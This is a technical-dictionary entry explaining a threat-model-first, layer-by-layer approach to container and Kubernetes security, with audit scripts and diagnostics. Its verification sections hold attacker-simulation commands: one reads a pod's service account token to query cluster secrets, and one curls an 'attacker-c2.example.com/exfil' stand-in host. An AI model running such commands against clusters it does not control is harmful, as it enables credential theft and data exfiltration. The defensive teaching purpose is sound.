---
id: CTR-031
title: Container Security Mental Model
category: Containers
tier: tier-6-infrastructure-devops
folder: CTR-containers
difficulty: ★★★
depends_on: CTR-035, CTR-048, CTR-055
used_by:
related: CTR-048, CTR-055
tags:
  - containers
  - security
  - mental-model
  - advanced
  - bestpractice
status: complete
version: 2
layout: default
parent: "Containers"
grand_parent: "Technical Dictionary"
nav_order: 56
permalink: /ctr/container-security-mental-model/
---

# CTR-023 - Container Security Mental Model

⚡ TL;DR - The container security mental model is threat-model-first thinking: identify the attack surface at each layer (supply chain, runtime, network, secrets, kernel), define the blast radius of each compromise, and apply the minimum control set that reduces blast radius to an acceptable level.

| Metadata        |                          |     |
| :-------------- | :----------------------- | :-- |
| **Depends on:** | CTR-035, CTR-048, CTR-055 |     |
| **Used by:**    |                          |     |
| **Related:**    | CTR-048, CTR-055         |     |

---

### 🔥 The Problem This Solves

**WORLD WITHOUT IT:**
A security team applies container security controls reactively: non-root
after a pentest recommendation, image scanning after a CVE disclosure,
network policies after a lateral movement incident. Each control is
added in response to an incident, not as part of a coherent threat
model. The controls don't form a consistent defence because they weren't
designed together - they were bolted on.

**THE BREAKING POINT:**
A compliance audit requires the team to demonstrate container security.
The team lists their controls: "we use non-root, we scan images, we
have a network policy." The auditor asks: "what is your threat model?
What is the blast radius if container X is fully compromised?" The team
cannot answer because they have no mental model - only a checklist.

**THE INVENTION MOMENT:**
The container security mental model reframes security from "what controls
do we have?" to "what can an attacker do at each layer, and which
controls limit their blast radius?" This threat-model-first approach
produces a consistent, gap-free security posture rather than a reactive
checklist.

**EVOLUTION:**
2014: Docker security guidance focuses on "don't run as root." 2017:
Kubernetes Pod Security Policy (deprecated 2021) adds cluster-level
controls. 2019: NIST SP 800-190 (Application Container Security Guide)
formalises the layered threat model. 2021: Supply chain attacks (Solar-
Winds, Log4Shell) shift focus to the build-time attack surface. 2022:
CIS Benchmark for Docker and Kubernetes provides a scored control
framework. 2023: SLSA framework integrates supply chain security into
the container security model.

---

### 📘 Textbook Definition

**Container security mental model** is a threat-model-first framework
for reasoning about container security: for each layer of the container
stack (build, image, registry, admission, runtime, network, secrets,
host kernel), identify the attack surface, the likely attack vectors,
the blast radius of a successful attack, and the minimum control set
that reduces blast radius to an acceptable level. The mental model
enables consistent, gap-free security design rather than reactive,
checklist-driven security.

---

### ⏱️ Understand It in 30 Seconds

**One line:**
For each container layer, ask: what can an attacker do here, and what
controls limit the damage?

**One analogy:**

> Container security mental model is like a building fire safety plan.
> You do not ask "do we have fire extinguishers?" (checklist). You ask
> "if a fire starts in the kitchen, how far can it spread? Which doors
> contain it? How fast is evacuation? Where are the fire suppression
> systems?" The mental model maps fire paths (attack vectors) and
> containment mechanisms (controls) across the entire building (stack).

**One insight:**
The most valuable output of the container security mental model is the
blast radius assessment: "if this specific container is fully compromised,
what data, systems, and services can the attacker reach?" Reducing blast
radius is more reliable than preventing the initial compromise, because
vulnerabilities in application code are inevitable.

---

### 🔩 First Principles Explanation

**CORE INVARIANTS:**

1. **Compromise is inevitable** - assume any container will eventually
   be compromised via a vulnerability in application code, dependency,
   or configuration. Design to limit blast radius, not just to prevent
   entry.
2. **Each layer has an independent attack surface** - a supply chain
   compromise (malicious base image) is a different attack vector from
   a runtime exploit (CVE in running code). Controls at one layer do
   not protect other layers.
3. **Blast radius is proportional to privilege and reachability** -
   a compromised container with host root, host network, and access to
   all secrets has maximum blast radius. A compromised container with
   no privileges, a restricted network, and no secret access has minimum
   blast radius.
4. **The human is the most attacked layer** - phishing, credential theft,
   and social engineering to gain CI access or registry credentials are
   more common than kernel exploits in practice.

**DERIVED DESIGN:**
Given invariant 1: design the security posture assuming a container
is compromised. Ask "what can the attacker reach?" before asking "how
do we prevent the compromise?". Given invariant 3: minimise privilege
and reachability at every layer to reduce blast radius.

**THE TRADE-OFFS:**
**Gain:** Threat-model-first design produces consistent, gap-free
controls aligned with actual attack vectors.
**Cost:** Threat modelling takes time and requires security knowledge.
Reactive checklists are faster but leave gaps.

**ESSENTIAL vs ACCIDENTAL COMPLEXITY:**
**Essential:** Every layer of the container stack has a distinct attack
surface; each requires independent controls.
**Accidental:** Overlapping controls at the same layer without covering
different attack vectors (e.g., two image scanners but no network policy).

---

### 🧪 Thought Experiment

**SETUP:**
Apply the container security mental model to a payment processing
microservice containerised in Kubernetes.

**LAYER-BY-LAYER THREAT MODEL:**

Build layer: attack vector = malicious dependency in npm (supply chain).
Blast radius = all pods running the compromised image.
Control = Sigstore dependency signing, Renovate for dependency updates.

Image layer: attack vector = base image with critical CVE.
Blast radius = exploitable from inside all running containers.
Control = Trivy scan in CI + continuous registry scan.

Runtime layer: attack vector = RCE in payment processing code.
Blast radius = container's full privilege set.
Control = non-root, dropped capabilities, readOnlyRootFilesystem,
seccomp profile.

Network layer: attack vector = lateral movement to other services.
Blast radius = all services reachable from the payment service network.
Control = NetworkPolicy default-deny, allow only payment-processor to
payment-db and payment-gateway.

Secrets layer: attack vector = steal payment API keys.
Blast radius = fraudulent transactions until keys are rotated.
Control = Vault dynamic secrets with 1-hour TTL, no keys in env vars.

Kernel layer: attack vector = kernel CVE exploitable from container.
Blast radius = host root access = all pods on the node.
Control = seccomp, gVisor RuntimeClass for payment service.

**THE INSIGHT:**
Each layer has a different blast radius. The kernel layer has the
highest (host root = entire node). The secrets layer has high business
impact (fraud). The network layer determines lateral movement scope.
The mental model reveals that the highest-priority control for this
workload is: network isolation (prevent lateral movement) + secrets
security (prevent fraud) + seccomp/gVisor (prevent kernel escape).
Not just "non-root and scan images."

---

### 🧠 Mental Model / Analogy

> Container security is like an onion with concentric defensive rings.
> The outermost ring is supply chain (build-time): compromise here
> affects everything inside. The next ring is the image (registry):
> a vulnerable image affects all its instances. The next ring is admission
> (deployment gate): a misconfigured pod bypasses runtime controls.
> The inner rings are runtime, network, and secrets - each independently
> limits blast radius. The innermost ring is the host kernel: a kernel
> exploit defeats all outer rings.

Element mapping:

- **Outer ring** = supply chain (broadest blast radius)
- **Middle rings** = image, admission, runtime, network, secrets
- **Inner ring** = host kernel (requires final control: gVisor/Kata)
- **Onion depth** = attack complexity required
- **Ring diameter** = blast radius at that layer

Where this analogy breaks down: a real onion's rings are concentric
and uniform; container security layers can be bypassed independently
(a runtime exploit does not require defeating the supply chain layer).

---

### 📶 Gradual Depth - Four Levels

**Level 1 - What it is (anyone can understand):**
Container security mental model is asking "if someone breaks into my
container, how much damage can they do and to what?" - and then adding
controls to limit that damage.

**Level 2 - How to use it (junior developer):**
For any containerised service, work through three questions: (1) What
can an attacker do from inside this container? (List: read secrets,
access network, escape to host, etc.). (2) Which controls limit each
action? (Non-root limits privilege escalation; network policy limits
reachability; secrets management limits credential exposure). (3) Are
there gaps (actions the attacker can take with no limiting control)?

**Level 3 - How it works (mid-level engineer):**
Apply the STRIDE threat model (Spoofing, Tampering, Repudiation,
Information Disclosure, Denial of Service, Elevation of Privilege)
to each container security layer. For each STRIDE threat category,
identify: the specific attack vector at this layer, the blast radius,
the current control, and any gap. The output is a gap analysis that
drives control prioritisation.

**Level 4 - Why it was designed this way (senior/staff):**
Checklist-driven security fails because checklists are reactive (based
on known past attacks) and don't model attacker reasoning. Threat-model-
first security is proactive: it reasons from the attacker's perspective
("what would I want to achieve, and how could I reach it from this
container?") to identify gaps before they are exploited. The container
security mental model is threat modelling applied to the specific attack
surface structure of containerised systems: supply chain, runtime,
network, secrets, and kernel - each with distinct entry points and
blast radii.

**Expert Thinking Cues:**

- "If I were an attacker who had just achieved RCE in this container,
  what are my first three actions? Can any of those be blocked or detected?"
- "What is the blast radius of this container being fully compromised?
  List every system and data store the attacker could reach."
- "Which control in our security posture, if removed, would increase
  blast radius the most? Is that control the highest priority to maintain?"

---

### ⚙️ How It Works (Mechanism)

**CONTAINER SECURITY THREAT MODEL - LAYER MAP:**

```
Layer            Attack Surface         Key Control
-----------      ------------------     ----------------------
Supply Chain     Malicious dependency   Sigstore, SBOM, Renovate
Image            Vulnerable packages    Trivy, continuous scan
Registry         Image tampering        Cosign, RBAC on registry
Admission        Misconfigured pod      Kyverno/OPA Enforce mode
Runtime          RCE via app CVE        non-root, seccomp, caps
Network          Lateral movement       NetworkPolicy default-deny
Secrets          Credential theft       Vault, no env var secrets
Kernel           Container escape       seccomp, AppArmor, gVisor
Host             Node compromise        Node hardening, RBAC
```

**BLAST RADIUS REDUCTION CHECKLIST:**

```
Reduce privilege (limit what attacker can do):
  [ ] runAsNonRoot: true
  [ ] capabilities: drop ALL
  [ ] allowPrivilegeEscalation: false
  [ ] readOnlyRootFilesystem: true
  [ ] seccomp: RuntimeDefault or custom profile

Reduce reachability (limit where attacker can go):
  [ ] NetworkPolicy: default-deny
  [ ] Service account: minimal RBAC
  [ ] No cluster-admin roles for application pods
  [ ] Secrets: minimal scope, short TTL

Reduce detectability window (detect faster):
  [ ] Falco runtime anomaly detection
  [ ] Audit logging for Kubernetes API
  [ ] Image pull logging (detect new image sources)
```

---

### 🔄 The Complete Picture - End-to-End Flow

**NORMAL FLOW (applying the mental model to a new service):**

```
New containerised service design
  |
  v
Define blast radius: what can attacker reach?
  |         ← YOU ARE HERE
  v
Layer-by-layer threat model:
  supply chain / image / admission /
  runtime / network / secrets / kernel
  |
  v
For each layer: identify gaps (attack vectors
with no limiting control)
  |
  v
Prioritise gaps by blast radius impact
  |
  v
Apply minimum control set to close
highest-priority gaps
  |
  v
Document threat model + accepted residual risks
```

**FAILURE PATH:**
Security team runs the mental model but classifies the kernel escape
risk as "low likelihood - accepted." A kernel CVE is disclosed 3 months
later. The risk that was "accepted" becomes an incident. Without the
mental model having documented the accepted residual risk, there is no
clear owner and no mitigation plan ready.

**WHAT CHANGES AT SCALE:**
At scale, individual service threat models are replaced by a service
tier classification: "Tier 1 (external-facing, sensitive data): full
threat model, gVisor, mandatory controls. Tier 2 (internal services):
standard controls. Tier 3 (batch, low-risk): baseline controls." The
mental model defines each tier's control requirements.

---

### 💻 Code Example

```bash
# Threat model validation script:
# Check all pods in namespace for security gaps

#!/bin/bash
NAMESPACE=${1:-default}
echo "=== Container Security Mental Model Audit ==="
echo "Namespace: $NAMESPACE"
echo ""

# Gap 1: Running as root?
echo ">> Pods running as root (gap: privilege):"
kubectl get pods -n $NAMESPACE -o json | jq -r '
  .items[] |
  select(
    (.spec.securityContext.runAsNonRoot != true) or
    (.spec.containers[].securityContext.runAsNonRoot != true)
  ) | .metadata.name'

# Gap 2: No network policy?
echo ">> NetworkPolicy coverage:"
kubectl get networkpolicy -n $NAMESPACE
# If empty: default-allow (gap: lateral movement unrestricted)

# Gap 3: Secrets in env vars?
echo ">> Pods with secrets in env vars (gap: credential exposure):"
kubectl get pods -n $NAMESPACE -o json | jq -r '
  .items[] |
  select(
    .spec.containers[].env[]? |
    .valueFrom.secretKeyRef != null
  ) | .metadata.name'

# Gap 4: No resource limits?
echo ">> Pods without resource limits (gap: DoS):"
kubectl get pods -n $NAMESPACE -o json | jq -r '
  .items[] |
  select(
    .spec.containers[].resources.limits == null
  ) | .metadata.name'
```

```yaml
# Security posture document template
# (threat model output for a service)
# Service: payment-processor
# Last reviewed: 2026-01-15
# Threat model owner: platform-security@company.com

# Layer: Runtime
# Attack vector: RCE via application CVE
# Blast radius (without controls): host root via kernel exploit
# Blast radius (with controls): limited to container process
# Controls applied:
#   - runAsNonRoot: true, runAsUser: 1000
#   - capabilities: drop ALL
#   - seccomp: RuntimeDefault
#   - readOnlyRootFilesystem: true
# Residual risk: unknown future seccomp bypass
# Residual risk owner: platform-security@company.com
# Mitigating factor: gVisor RuntimeClass applied (see kernel layer)
```

**How to test / verify correctness:**

```bash
# Run kubescape to validate against NSA/CISA framework
kubectl apply -f \
  https://github.com/kubescape/kubescape/.../kubescape.yaml
kubescape scan framework nsa -n default

# Run kube-bench for CIS Kubernetes Benchmark
kubectl apply -f https://raw.githubusercontent.com/\
  aquasecurity/kube-bench/main/job.yaml
kubectl logs kube-bench-xxxxx

# Simulate attacker from inside container
# (test blast radius manually)
kubectl exec -it <pod> -- sh -c '
  # Can we reach other services? (network reachability)
  curl http://other-service.other-ns.svc:8080/
  # Can we read kubernetes API? (RBAC exposure)
  curl https://kubernetes.default.svc/api/v1/secrets \
    -H "Authorization: Bearer $(cat /var/run/secrets/\
    kubernetes.io/serviceaccount/token)"
  # Can we write to filesystem? (rootfs writability)
  echo test > /etc/malicious
'
```

---

### ⚖️ Comparison Table

| Layer | Attack Vector | Blast Radius | Key Control | Gap if Missing |
|---|---|---|---|---|
| Supply chain | Malicious dep/base image | All image instances | Cosign, Trivy | Any instance runs attacker code |
| Runtime | RCE via app CVE | Container process | seccomp, non-root | Privilege escalation to host |
| Network | Lateral movement | All reachable services | NetworkPolicy | Entire cluster accessible |
| Secrets | Credential theft | All systems using secret | Vault, no env vars | Long-lived credential exposure |
| Kernel | Container escape | Host + all pods on node | gVisor, seccomp | Node-level compromise |
| Admission | Misconfigured pod | Deployed pod's capabilities | Kyverno Enforce | Bypasses all runtime controls |

---

### ⚠️ Common Misconceptions

| Misconception | Reality |
|---|---|
| "The security team is responsible for container security" | Container security is a shared responsibility: developers own Dockerfile security and application secrets handling; platform teams own admission policies and runtime controls; security teams own threat modelling and compliance. No single team owns all layers. |
| "If we pass the CVE scan, we are secure" | CVE scanning addresses the image layer only. It does not assess runtime configuration, network policies, secrets management, admission control, or kernel-level isolation. Passing a scan is necessary but not sufficient. |
| "Security controls reduce development velocity" | Well-designed controls (admission webhooks, golden path templates, secrets management automation) reduce the security decisions developers must make per-deployment. Correctly implemented, they reduce cognitive load, not increase it. |
| "A zero-trust network replaces container security" | Zero-trust network policies address the network layer (lateral movement). They do not address runtime privilege escalation, supply chain compromise, or kernel exploitation. Network zero-trust is one layer of the mental model, not the entire model. |
| "Once the threat model is done, we are finished" | The threat model is a living document. New vulnerabilities, new attack techniques, new services, and new infrastructure changes all modify the attack surface. Threat models should be reviewed after significant changes and at least annually. |

---

### 🚨 Failure Modes & Diagnosis

**Failure Mode 1: Blast Radius Not Documented**
**Symptom:** A container is compromised. The incident response team
does not know which data stores, services, or secrets the attacker
could have accessed. Forensic investigation takes 3 days instead of
3 hours.
**Root Cause:** No blast radius analysis was conducted for this service.
The incident response team must reverse-engineer the potential access
from the container's network policy, RBAC, and secrets mounts.
**Diagnostic:**

```bash
# Retroactively determine blast radius
# 1. Which services can this pod reach?
kubectl get networkpolicy -n $NS -o yaml | \
  grep -A 20 "podSelector"

# 2. What Kubernetes RBAC does the service account have?
SA=$(kubectl get pod <pod> -o json | \
  jq -r '.spec.serviceAccountName')
kubectl get rolebinding,clusterrolebinding -A -o json | \
  jq --arg SA "$SA" '
  .items[] |
  select(.subjects[]?.name == $SA)'

# 3. What secrets are mounted?
kubectl get pod <pod> -o json | \
  jq '.spec.volumes[] | select(.secret != null)'
```

**Fix:** Document blast radius for all services as part of the threat
model. Store in the service's runbook.
**Prevention:** Make blast radius documentation a pre-deployment
requirement. Include it in the service's architecture decision record.

---

**Failure Mode 2: Security Controls Only in Non-Production**
**Symptom:** Security audit finds that Kyverno policies are enforced
in staging but in audit mode in production ("to avoid disrupting
production").
**Root Cause:** Team deployed controls to staging for testing but did
not graduate to production enforcement due to fear of blocking deployments.
**Diagnostic:**

```bash
# Check enforcement mode per namespace per policy
kubectl get clusterpolicies -o json | jq '
  .items[] | {
    name: .metadata.name,
    action: .spec.validationFailureAction
  }'

# Check if namespaceSelector excludes production
kubectl get clusterpolicies -o yaml | \
  grep -A 5 "namespaceSelector"
```

**Fix:** Graduate all policies to Enforce mode in production. Fix any
violations before graduating. Non-compliant workloads must be fixed,
not excluded from policy scope.
**Prevention:** Security controls must be in Enforce mode in ALL
environments including production. Audit mode is a transition state
only. Track graduation from audit to enforce as a security KPI.

---

**Failure Mode 3: Threat Model Not Reviewed After Architecture Change**
**Symptom:** A new external service dependency is added to a container
(outbound API calls to a third-party payment provider). The network
policy was not updated. The container now has unrestricted egress,
and a compromise enables exfiltration of payment data to any external
endpoint.
**Root Cause:** The threat model and network policies were not reviewed
after the architecture change (new outbound dependency).
**Diagnostic:**

```bash
# Check current egress network policy for the service
kubectl get networkpolicy -n payment -o yaml | \
  grep -A 20 "egress"
# If empty or no egress rules: unrestricted outbound traffic

# Test what external endpoints the pod can reach
kubectl exec -it payment-pod -- \
  curl -m 5 https://attacker-c2.example.com/exfil
# If successful: no egress restriction
```

**Fix:** Update NetworkPolicy to allow egress only to payment-provider.example.com
on port 443. Deny all other egress by default.
**Prevention:** Architecture change review includes: does this change
add or modify network dependencies? If yes, threat model and network
policy review is mandatory.

---

### 🔗 Related Keywords

**Prerequisites (understand these first):**

- [[CTR-035 - Container Security]] - baseline container security concepts
- [[CTR-048 - Container Security Architecture]] - defense-in-depth architecture
- [[CTR-055 - Container Security Research (Rootless, gVisor)]] - advanced isolation

**Builds On This (learn these next):**

- Apply to specific workloads using CTR-048 controls and CTR-056
  trade-off framing

**Alternatives / Comparisons:**

- [[CTR-048 - Container Security Architecture]] - the architectural implementation
- [[CTR-055 - Container Security Research (Rootless, gVisor)]] - kernel isolation layer

---

### 📌 Quick Reference Card

```
┌────────────────────────────────────────────────────┐
│ WHAT IT IS  │ Threat-model-first container security│
│ PROBLEM     │ Reactive checklists leave gaps       │
│ KEY INSIGHT │ Blast radius > prevention            │
│ USE WHEN    │ Designing or auditing container sec  │
│ AVOID WHEN  │ N/A - always apply threat model first│
│ TRADE-OFF   │ Modelling time vs. checklist speed   │
│ ONE-LINER   │ 8 layers, each with blast radius    │
│ NEXT EXPLORE│ CTR-048 Architecture, CTR-055 Adv   │
└────────────────────────────────────────────────────┘
```

**If you remember only 3 things:**

1. Assume compromise is inevitable - design to reduce blast radius,
   not just to prevent entry.
2. Each layer (supply chain, runtime, network, secrets, kernel) has
   an independent attack surface and requires independent controls.
3. Blast radius is proportional to privilege + reachability - reducing
   both is the primary goal of every container security control.

**Interview one-liner:**
"The container security mental model is threat-model-first: for each
layer (supply chain, image, admission, runtime, network, secrets, kernel)
identify attack vectors and blast radius, then apply the minimum control
set that reduces blast radius to an acceptable level - because application
vulnerabilities are inevitable and blast radius management is more
reliable than perfect prevention."

---

### 💎 Transferable Wisdom

**Reusable Engineering Principle:**
In any sufficiently complex system, entry point prevention is insufficient
because: (1) attack surfaces are too large to fully protect, (2) zero-days
exist that bypass current controls, and (3) insider threats bypass perimeter
controls entirely. Blast radius reduction (limit what an attacker can do
after entry) is a more reliable security strategy than entry prevention
alone. Design systems to fail safe: assume the perimeter is breached
and ask "how much damage can the attacker do?"

**Where else this pattern appears:**

- **Zero-trust network architecture:** Assumes any network segment can
  be compromised. Enforces authentication and authorisation at every
  service-to-service call. Blast radius is limited to the compromised
  service's access scope, not the entire network.
- **Least-privilege IAM:** IAM policies grant the minimum permissions
  required. A compromised credential can only access what that credential
  was authorised for. Blast radius is limited by IAM scope.
- **Database encryption at rest:** Assumes the database server can be
  compromised. Encrypts data so that access to the server does not
  automatically grant access to the data. Blast radius is limited to
  the decryption key scope.

---

### 💡 The Surprising Truth

The most common container security incident in practice is not a
sophisticated kernel exploit or a supply chain attack - it is a
developer accidentally committing an API key or database password to
a container image (in a RUN command that was deleted in the final
Dockerfile layer but persists in the image history). Container registries
regularly find thousands of credentials embedded in public images.
The 2023 GitGuardian State of Secrets Sprawl report found over 10
million secrets exposed in public code and container images. The
"attacker" in most cases is not a sophisticated threat actor - it is
an automated scanner looking for exposed credentials. The simplest and
most impactful container security control is secrets scanning in CI,
not runtime threat detection.

---

### 🧠 Think About This Before We Continue

**Q1 (D - Root Cause):** A Kubernetes pod's service account token
(auto-mounted by default in `/var/run/secrets/kubernetes.io/serviceaccount/token`)
is exposed when the pod is compromised. The attacker uses the token
to list all secrets in the cluster via the Kubernetes API. How many
configuration failures led to this blast radius, and what is the
minimum change set that would have contained it?
*Hint:* Consider: (1) auto-mounted service account token (disable
`automountServiceAccountToken: false` if not needed), (2) service
account RBAC (why does this service account have `list secrets` globally?),
(3) network policy (can the compromised pod reach the Kubernetes API at
all?). Three independent control failures - which one has the highest
blast radius impact if fixed?

**Q2 (C - Design Trade-off):** A security team proposes encrypting all
container images at rest in the registry (OCI image encryption). An
architect argues this adds complexity without meaningfully improving
security because the runtime must decrypt the image, which means the
decryption key is present in the environment anyway. Who is correct,
and under what specific threat model does image encryption at rest
provide genuine security value?
*Hint:* Consider: what does "at rest" encryption protect against?
(Physical theft of storage, insider access to the registry's object
store). What does it NOT protect against? (An attacker who can pull
and run containers has the decryption key available). For what
compliance requirements is at-rest encryption mandated regardless of
its operational security value?

**Q3 (B - Scale):** A platform runs 500 containers across 50 services.
The security team has capacity to conduct detailed threat model reviews
for 10 services per quarter. How do you prioritise which services
receive the detailed review, and what lightweight alternative covers
the remaining 40 services per quarter?
*Hint:* Consider risk-tiering criteria: external attack surface (internet-
facing = higher priority), data sensitivity (PII/payment = higher priority),
privilege level (cluster-admin SA = higher priority), and blast radius
(microservice with database access = higher priority). What is the
lightweight alternative for lower-risk services (automated scanning,
self-service threat model template)?